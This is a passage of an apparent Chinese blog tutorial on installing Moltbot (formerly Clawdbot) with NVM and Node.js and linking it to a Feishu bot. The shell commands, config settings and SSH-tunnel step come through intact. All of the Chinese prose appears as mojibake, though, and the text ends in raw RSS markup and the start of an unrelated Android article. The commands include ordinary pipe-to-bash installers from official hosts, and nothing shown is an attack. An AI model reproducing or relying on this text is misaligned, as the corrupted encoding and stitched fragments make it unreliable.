<p>å¦‚æœä½ ä¸æƒ³å®‰è£…ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨é˜¿é‡Œäº‘çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Factivity%2Fecs%2Fclawdbot%3FuserCode%3Doq2t54oi" target="_blank" title="https://www.aliyun.com/activity/ecs/clawdbot?userCode=oq2t54oi" ref="nofollow noopener noreferrer">Clawdbot ä¸€é”®éƒ¨ç½²</a>ï¼Œéƒ¨ç½²ä¹‹åå¯ä»¥ç›´æ¥è·³åˆ°<a href="#%E5%AF%B9%E6%8E%A5%E9%A3%9E%E4%B9%A6" title="#%E5%AF%B9%E6%8E%A5%E9%A3%9E%E4%B9%A6">å¯¹æ¥é£ä¹¦</a>ã€‚</p>
</blockquote>
<p>ç¬¬ä¸€æ­¥å®‰è£… Git</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å®‰è£… Git</span>
sudo apt update
sudo apt install git -y
</code></pre>
<p>ç¬¬äºŒæ­¥å®‰è£… Node.js</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å®‰è£… NVM</span>
<span class="hljs-meta prompt_"># </span><span class="bash">å›½å†…ä½¿ç”¨ gitee çš„é•œåƒæº</span>
curl -o- https://gitee.com/RubyMetric/nvm-cn/raw/main/install.sh | bash
<span class="hljs-meta prompt_">
# </span><span class="bash">å›½å¤–ä½¿ç”¨</span>
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash
<span class="hljs-meta prompt_">
# </span><span class="bash">é‡æ–°åŠ è½½ç¯å¢ƒå˜é‡</span>
source ~/.bashrc
<span class="hljs-meta prompt_">
# </span><span class="bash">å®‰è£… Node.js 22</span>
nvm install 22
<span class="hljs-meta prompt_">
# </span><span class="bash">æŸ¥çœ‹ nodejs ç‰ˆæœ¬</span>
node -v # è¾“å‡º v22 å³å¯ï¼Œç‰ˆæœ¬åªè¦ 22 å°±è¡Œ
</code></pre>
<h3 data-id="heading-2">å®‰è£… Moltbot (åŸ Clawdbot)</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">ä½¿ç”¨å®˜æ–¹è„šæœ¬å®‰è£…</span>
curl -fsSL https://molt.bot/install.sh | bash
</code></pre>
<blockquote>
<p>æœåŠ¡å™¨åœ¨å›½å†…ï¼Œå¦‚æœå®‰è£…å¤±è´¥çš„è¯ï¼Œå¯èƒ½éœ€è¦è§£å†³ç½‘ç»œé—®é¢˜</p>
</blockquote>
<p>å…¶ä»–å¹³å°å®‰è£…æ–¹å¼è¯·å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.molt.bot%2Finstall%2Finstaller" target="_blank" title="https://docs.molt.bot/install/installer" ref="nofollow noopener noreferrer">Moltbot (åŸClawdbot) å®‰è£…æ–‡æ¡£</a></p>
<p>ä½ ä¼šçœ‹åˆ°å¦‚ä¸‹å›¾è¾“å‡º
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4432daf195774d8eabdf531139f0ecf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=o3t2VKxEchRj%2FtuoSThFLmwiyyo%3D" alt="Clawedbot å®‰è£…è¿‡ç¨‹ - AI åŠ©æ‰‹éƒ¨ç½²åˆå§‹åŒ–" loading="lazy"/>
å¦‚æœé¦–æ¬¡å®‰è£…ï¼Œæ—¶é—´ä¼šå¾ˆé•¿ï¼Œéœ€è¦è€å¿ƒç­‰å¾…ã€‚
å¦‚æœæœ€åè¾“å‡ºå¦‚ä¸‹å†…å®¹ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">â†’ npm install failed; cleaning up and retrying...
</code></pre>
<p><code>ctrl+c</code> é€€å‡ºï¼Œé‡æ–°è¿è¡Œå®‰è£…è„šæœ¬ç„¶åç»§ç»­ç­‰å¾…ä¸‹ã€‚</p>
<p>æˆåŠŸä¹‹åä¼šè¾“å‡ºå¦‚ä¸‹å›¾ç‰‡
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c265e7182c94702b1462a96fba49440~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=zxN7chpihwXv5SDMqr%2BOVpiBmXw%3D" alt="Clawedbot å®‰è£…æˆåŠŸ - AI æœºå™¨äººé…ç½®å‘å¯¼" loading="lazy"/>
ç¬¬ä¸€ä¸ªé€‰é¡¹é€‰æ‹© <code>yes</code>, å°±æ˜¯è¯¢é—®ä½ æ˜¯å¦çŸ¥é“é£é™©çš„ã€‚
ç¬¬äºŒæ­¥é€‰æ‹© <code>QuickStart</code>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90baa7dd9f44408fa805a6a013c2a9d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=4uSH5bscN8BDyCK8RadJRt%2Bc19M%3D" alt="Clawedbot QuickStart å¿«é€Ÿå¼€å§‹é€‰é¡¹" loading="lazy"/>
ç¬¬ä¸‰æ­¥é€‰æ‹©æ¨¡å‹æœåŠ¡å•†ï¼Œè¿™é‡Œé€‰æ‹© <code>Qwen</code>ï¼Œå…è´¹é¢åº¦å……è¶³ï¼Œé€‚åˆå…¥é—¨ä½¿ç”¨
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb675fe30be84601872b05a2d3de31a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=qaEfL0q1vUfxbrzYHs1fVAXKyjw%3D" alt="Clawedbot é€‰æ‹© AI æ¨¡å‹æœåŠ¡å•† Qwen åƒé—®" loading="lazy"/>
é€‰æ‹©åƒé—®æ¨¡å‹åï¼Œä¼šæä¾›ä¸€ä¸ªé“¾æ¥ï¼Œå¤åˆ¶å¹¶åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ï¼Œå¦‚ä¸‹å›¾
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fecf1577d1d6417ea7e46a6048f940ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=MD3dh2GSAE7H8CDV2KuKps4kfv0%3D" alt="Clawedbot åƒé—®æ¨¡å‹æˆæƒé“¾æ¥" loading="lazy"/>
æ‰“å¼€æµè§ˆå™¨åï¼Œä¼šçœ‹åˆ°å¦‚ä¸‹ç•Œé¢ã€‚ç”±äºæˆ‘å·²ç™»å½•è¿‡ï¼Œæ‰€ä»¥æ˜¾ç¤ºè´¦æˆ·ä¿¡æ¯ï¼›å¦‚æœå°šæœªç™»å½•ï¼ŒæŒ‰ç…§æç¤ºå®Œæˆç™»å½•å³å¯ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c8ccc1ef92f46e2ad7c9ab8595a8b40~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=tEgrzQMvsLWvg3OZJ2h2PzGkXvg%3D" alt="Clawedbot åƒé—® AI è´¦æˆ·ç™»å½•é¡µé¢" loading="lazy"/>
ç™»å½•å®Œæˆåï¼Œä¼šå‡ºç°ä»¥ä¸‹é€‰é¡¹ï¼Œæç¤ºé€‰æ‹©å¯¹åº”çš„åƒé—®æ¨¡å‹ï¼Œå¦‚ä¸‹å›¾
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bcb66e809f94b6591fb158840f51786~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=hbhi2JMKpZh7accgqzR%2FETudNSo%3D" alt="Clawedbot é€‰æ‹©åƒé—® AI æ¨¡å‹ç‰ˆæœ¬" loading="lazy"/>
é€‰æ‹©é»˜è®¤æ¨¡å‹å³å¯ã€‚æ¥ä¸‹æ¥ä¼šæç¤ºé€‰æ‹© channelï¼Œè¿™é‡Œå…ˆè·³è¿‡ï¼Œåç»­å†æ·»åŠ 
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e902fc02e34a495ab66e360877d2ecab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=XXp0eqFvHQEWIJg88zhMoARNzqE%3D" alt="Clawedbot channel æ¸ é“é…ç½®é€‰é¡¹" loading="lazy"/>
ç»§ç»­ä¸‹é¢é€‰æ‹© skillsï¼Œä¹Ÿæ˜¯é€‰æ‹© <code>No</code>ï¼Œå¦‚ä¸‹å›¾
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3af053853d44ca78a5335c172d5ef63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=ZIpQFIM9XsOgWdCPi%2BHbm6%2F6LRE%3D" alt="Clawedbot skills æŠ€èƒ½é…ç½®é€‰é¡¹" loading="lazy"/>
ç»§ç»­ä¸‹é¢é€‰æ‹© hooksï¼Œä¹Ÿæ˜¯ä½¿ç”¨<code>ç©ºæ ¼</code>é€‰æ‹© <code>No</code>ï¼Œå¦‚ä¸‹å›¾
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5a3c06acdd94c4faf91c9aa50c85c5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=Gk6IvYYtV8m1mXPoYm8xTWWKacs%3D" alt="Clawedbot hooks é…ç½®é€‰é¡¹" loading="lazy"/>
ç„¶åç­‰å¾…å®‰è£…å®Œæˆï¼Œæœ€åä¼šå‡ºç°ä»¥ä¸‹é€‰é¡¹ï¼Œè¿™é‡Œé€‰æ‹© <code>TUI</code>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b533bdafa394a189de53975355baad1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=qCDWG485%2F2QDXGNRWLatjw7VxlE%3D" alt="Clawedbot é€‰æ‹© TUI ç»ˆç«¯ç•Œé¢" loading="lazy"/>
å¦‚æœçœ‹åˆ° TUI èŠå¤©ç•Œé¢ï¼Œè¯´æ˜å®‰è£…æˆåŠŸï¼Œå¯ä»¥å°è¯•è¾“å…¥ <code>Hello</code> è¿›è¡Œæµ‹è¯•ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03b591ac4ba847c1973f9e633f9976cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=gHa3bbD4rz%2BjB5%2F7yA9zp0HJk5I%3D" alt="Clawedbot TUI èŠå¤©ç•Œé¢ - AI åŠ©æ‰‹å¯¹è¯æµ‹è¯•" loading="lazy"/>
ç„¶åç›´æ¥ä½¿ç”¨ <code>ctrl+c</code> å…ˆå…³é—­ï¼Œåé¢æˆ‘ä»¬å†æ¥è®¾ç½®</p>
<h4 data-id="heading-3">æŸ¥çœ‹æœåŠ¡</h4>
<p>å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥æŸ¥çœ‹</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot status
</code></pre>
<p>ä¼šçœ‹åˆ°å¦‚ä¸‹å›¾çš„ç»“æœå°±è¯´æ˜æœåŠ¡å¯åŠ¨äº†
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f027b3ffccec4a03ae17506048a98df8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=dsPRavYwSLzcznixo1lg%2BeCrE3s%3D" alt="Clawedbot æœåŠ¡çŠ¶æ€æ£€æŸ¥ - AI åŠ©æ‰‹è¿è¡Œä¸­" loading="lazy"/></p>
<h4 data-id="heading-4">è®¿é—® Web UI é¢æ¿</h4>
<p>å¦‚ä½•è®¿é—®é¢æ¿ï¼ŸæœåŠ¡ç›‘å¬åœ¨ <code>http://127.0.0.1:18789/</code> ç«¯å£ä¸Šï¼Œæˆ‘ä»¬ç°åœ¨é€šè¿‡ ssh éš§é“æ¥è®¿é—®ï¼Œè¾“å…¥ä¸‹é¢çš„å‘½ä»¤</p>
<pre><code class="hljs language-shell" lang="shell">ssh -N -L 18789:127.0.0.1:18789 ç”¨æˆ·å@æœåŠ¡å™¨IP
<span class="hljs-meta prompt_"># </span><span class="bash">å›è½¦ä¹‹å</span>
ç”¨æˆ·å@æœåŠ¡å™¨IP's password: # è¾“å…¥å¯†ç 
</code></pre>
<p>ç„¶ååœ¨æµè§ˆå™¨æ‰“å¼€ <code>http://127.0.0.1:18789/</code>, ä½ ä¼šçœ‹åˆ° Dashboard äº†ï¼Œå¦‚ä¸‹å›¾
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40398e25cb2d469583b8a8239d8d1060~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=XazLmIegoDbaCwelNoLxRZI5K7g%3D" alt="Clawedbot Web UI Dashboard æœªæˆæƒé¡µé¢" loading="lazy"/>
å›¾ä¸­æ˜¾ç¤ºçš„æ˜¯æœªæˆæƒçŠ¶æ€ï¼Œå›åˆ°æœåŠ¡å™¨ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot dashboard
</code></pre>
<p>ä¼šçœ‹åˆ°ä¸‹é¢çš„é¢æ¿æ•°æ®
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cddaf0d7687f47d986c54d9303ac1730~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=r55d9h2KdKvqdc%2F4pJKV5ITcno4%3D" alt="Clawedbot Dashboard URL è·å–å‘½ä»¤" loading="lazy"/>
å¤åˆ¶å¯¹åº”çš„ <code>Dashboard URL</code> åˆ°æµè§ˆå™¨æ‰“å¼€ï¼Œå³å¯æ­£å¸¸æŸ¥çœ‹èŠå¤©è®°å½•ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dca7f431b4b24c618cbad4d2ba97e58b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=9NnNq1DTC6Ajhtt%2BoyDfyC7O6QA%3D" alt="Clawedbot Web UI ç®¡ç†é¢æ¿ - AI åŠ©æ‰‹èŠå¤©è®°å½•" loading="lazy"/></p>
<p>è‡³æ­¤ Moltbot å·²å®‰è£…å®Œæˆï¼Œå¯ä»¥æ­£å¸¸è®¿é—®äº†ã€‚</p>
<h3 data-id="heading-5">å¯¹æ¥é£ä¹¦</h3>
<p>é¦–å…ˆå®‰è£…é£ä¹¦æ’ä»¶ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot plugins install @m1heng-clawd/feishu
</code></pre>
<p>ç™»å½•é£ä¹¦å¼€æ”¾å¹³å° <a href="https://link.juejin.cn?target=https%3A%2F%2Fopen.feishu.cn%25EF%25BC%258C%25E7%2582%25B9%25E5%2587%25BB%25E3%2580%258C%25E5%25BC%2580%25E5%258F%2591%25E8%2580%2585%25E5%2590%258E%25E5%258F%25B0" target="_blank" title="https://open.feishu.cn%EF%BC%8C%E7%82%B9%E5%87%BB%E3%80%8C%E5%BC%80%E5%8F%91%E8%80%85%E5%90%8E%E5%8F%B0" ref="nofollow noopener noreferrer">open.feishu.cnï¼Œç‚¹å‡»ã€Œå¼€å‘è€…åå°</a> -&gt; åˆ›å»ºä¼ä¸šè‡ªå»ºåº”ç”¨ã€ï¼Œå¦‚ä¸‹å›¾
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cce2257a2fed4ed5bb7f27f097a3bd49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=N7vWLEoRyiDgrP6E4L4psOQVl4M%3D" alt="é£ä¹¦å¼€æ”¾å¹³å°åˆ›å»ºä¼ä¸šè‡ªå»ºåº”ç”¨ - Clawedbot å¯¹æ¥" loading="lazy"/>
ç„¶åç‚¹å‡»åˆ›å»ºåº”ç”¨ï¼Œå¦‚ä¸‹
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d948b8631a424c43be3c44f13ad54f80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=yER3heT%2FgdM%2BgMywbZSwyja1tVk%3D" alt="é£ä¹¦åˆ›å»ºåº”ç”¨ - Clawedbot AI æœºå™¨äºº" loading="lazy"/>
åˆ›å»ºå®Œæˆåï¼Œé¦–å…ˆåˆ°å‡­æ®ç®¡ç†ä¸­è·å– App ID å’Œ App Secretï¼Œæ³¨æ„ä¿å­˜ï¼Œåç»­é…ç½®éœ€è¦ä½¿ç”¨ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c52a64d1c724b16b96af9ce4715d9d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=jCqxYqZQFpMUfSfSuUnIsiM2gnU%3D" alt="é£ä¹¦ App ID å’Œ App Secret å‡­æ®ç®¡ç†" loading="lazy"/>
ç„¶åæ·»åŠ æœºå™¨äººï¼Œå¦‚ä¸‹æ“ä½œ
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/feecd307b9d244d3851103fbdd5da8f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=wE2emMlpjlAMJguLetPB4oRzYU0%3D" alt="é£ä¹¦æ·»åŠ æœºå™¨äººèƒ½åŠ› - Clawedbot AI åŠ©æ‰‹" loading="lazy"/>
é¦–å…ˆé…ç½®ä¸ªåå­—
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c27542c578994a40b3a4bee84ee340f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=8j%2FRGIAlIEnHVLcVDFBAw9m2%2FyA%3D" alt="é£ä¹¦æœºå™¨äººåç§°é…ç½® - Clawedbot" loading="lazy"/></p>
<p>é£ä¹¦çš„å…¶ä»–é…ç½®å…ˆæš‚åœï¼Œå›åˆ°æœåŠ¡å™¨é…ç½® Moltbot çš„é£ä¹¦å‚æ•°</p>
<h4 data-id="heading-6">æ·»åŠ é£ä¹¦é…ç½®</h4>
<pre><code class="hljs language-shell" lang="shell">clawdbot config set channels.feishu.appId "é£ä¹¦ app id"

clawdbot config set channels.feishu.appSecret "é£ä¹¦ app secret"

clawdbot config set channels.feishu.enabled true
<span class="hljs-meta prompt_">
# </span><span class="bash">æ¨èä½¿ç”¨ websocket</span>
clawdbot config set channels.feishu.connectionMode websocket

clawdbot config set channels.feishu.dmPolicy pairing

clawdbot config set channels.feishu.groupPolicy allowlist

clawdbot config set channels.feishu.requireMention true
</code></pre>
<p>é…ç½®å®Œæˆä¹‹åï¼Œé‡å¯</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot gateway restart
</code></pre>
<p>é‡å¯å®Œæˆåå›åˆ°é£ä¹¦ï¼Œæ‰¾åˆ°ã€Œäº‹ä»¶å’Œå›è°ƒã€ï¼Œé€‰æ‹©é•¿è¿æ¥æ¨¡å¼ï¼Œå¦‚ä¸‹å›¾
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0756e47f1604c30bffd4dd482314bf7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=F%2FIUUHeed0c%2FMAVa8PldM31YmTY%3D" alt="é£ä¹¦äº‹ä»¶å’Œå›è°ƒé…ç½® - Clawedbot é•¿è¿æ¥æ¨¡å¼" loading="lazy"/>
å¦‚æœé…ç½®æˆåŠŸï¼Œè¯´æ˜è¿æ¥å·²å»ºç«‹ã€‚ç»§ç»­ä¸‹é¢çš„é…ç½®ï¼Œæ·»åŠ äº‹ä»¶ï¼Œé€‰æ‹©ã€Œæ¥æ”¶æ¶ˆæ¯ã€äº‹ä»¶
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d66580508aa4fdd8807d486da200d2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=79XmlTWqj%2B1%2BCxpd9fENztFkogo%3D" alt="é£ä¹¦æ·»åŠ æ¥æ”¶æ¶ˆæ¯äº‹ä»¶ - Clawedbot AI åŠ©æ‰‹" loading="lazy"/>
äº‹ä»¶æ·»åŠ å®Œæˆä¹‹åï¼Œè¿˜éœ€è¦å¼€é€šæƒé™ï¼Œæœ‰ä»¥ä¸‹æƒé™å…¨éƒ¨å‹¾é€‰</p>




















<table><thead><tr><th>æƒé™</th><th>Scopeï¼ˆèŒƒå›´ï¼‰</th><th>Descriptionï¼ˆè¯´æ˜ï¼‰</th></tr></thead><tbody><tr><td>contact:user.base:readonly</td><td>ç”¨æˆ·ä¿¡æ¯</td><td>è·å–åŸºç¡€ç”¨æˆ·ä¿¡æ¯</td></tr><tr><td>im:message</td><td>æ¶ˆæ¯ å…¨éƒ¨å‹¾é€‰</td><td>å‘é€å’Œæ¥æ”¶æ¶ˆæ¯</td></tr></tbody></table>
<p>å¦‚ä¸‹å›¾
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99562afeaf8e403da6e20f8647c68e85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=Epl0nZh1iLkPvGRLt%2BQ1gEK5dqM%3D" alt="é£ä¹¦æƒé™é…ç½® - Clawedbot ç”¨æˆ·ä¿¡æ¯æƒé™" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16863de4c8a74b70b1f88c8f3f3356aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=HX8YaAXaou9VC6lqJdWk95nf%2FGQ%3D" alt="é£ä¹¦æ¶ˆæ¯æƒé™é…ç½® - Clawedbot AI æœºå™¨äºº" loading="lazy"/></p>
<p>ä»¥ä¸Šæ­¥éª¤å…¨éƒ¨å®Œæˆåï¼Œå³å¯ä¸æœºå™¨äººå¯¹è¯ã€‚ä½†åœ¨æ­¤ä¹‹å‰éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªç‰ˆæœ¬
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f3525577dfc42af865ef7500f86d26f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=xJIe%2FPCXtttn0pK%2Bq9HxGRGc5cM%3D" alt="é£ä¹¦åº”ç”¨ç‰ˆæœ¬å‘å¸ƒ - Clawedbot AI åŠ©æ‰‹ä¸Šçº¿" loading="lazy"/></p>
<blockquote>
<p>æ³¨æ„ï¼šæ¯æ¬¡ä¿®æ”¹é…ç½®åéƒ½éœ€è¦é‡æ–°å‘å¸ƒç‰ˆæœ¬ï¼Œå»ºè®®å…¨éƒ¨é…ç½®å®Œæˆåå†ç»Ÿä¸€å‘å¸ƒã€‚</p>
</blockquote>
<p>å‘å¸ƒå®Œæˆåï¼Œå›åˆ°é£ä¹¦å®¢æˆ·ç«¯ï¼Œå¯ä»¥çœ‹åˆ°åº”ç”¨å·²ä¸Šçº¿ï¼Œç‚¹å‡»æ‰“å¼€åº”ç”¨
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccd2ad8e87344c5f9aaace124b2d78b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=6lyzx6BMz7hxA7ZEX0Dc%2FyaiO%2BU%3D" alt="é£ä¹¦åº”ç”¨å‘å¸ƒæˆåŠŸ - Clawedbot AI æœºå™¨äºº" loading="lazy"/>
å‘æœºå™¨äººå‘é€ <code>Hello</code>ï¼Œå³å¯æ”¶åˆ° Moltbot çš„å›å¤
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/852469090e234d3f9b24ce1738ae29e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmluZ29Hbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770251050&amp;x-signature=s2RhYm38760hrOulrIBU4THpOZk%3D" alt="é£ä¹¦ Clawedbot AI åŠ©æ‰‹å›å¤æµ‹è¯•æˆåŠŸ" loading="lazy"/></p>
<p>ç”±äºæµç¨‹è¾ƒé•¿ï¼Œå¦‚æœ‰å‹˜è¯¯ï¼Œè¿˜è¯·æŒ‡æ­£</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android åµŒå…¥å¼ç…§ç‰‡é€‰æ‹©å™¨ï¼Œè®©ä½“éªŒæ›´åŠ ä¸æ»‘]]></title>    <link>https://juejin.cn/post/7599963665039081522</link>    <guid>https://juejin.cn/post/7599963665039081522</guid>    <pubDate>2026-01-28T02:13:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7599963665039081522" data-draft-id="7599912857392726062" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android åµŒå…¥å¼ç…§ç‰‡é€‰æ‹©å™¨ï¼Œè®©ä½“éªŒæ›´åŠ ä¸æ»‘"/> <meta itemprop="keywords" content="Android,Android Jetpack"/> <meta itemprop="datePublished" content="2026-01-28T02:13:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é»„æ—æ™´"/> <meta itemprop="url" content="https://juejin.cn/user/3985057546510423"/></div> <div itemprop="publisher" 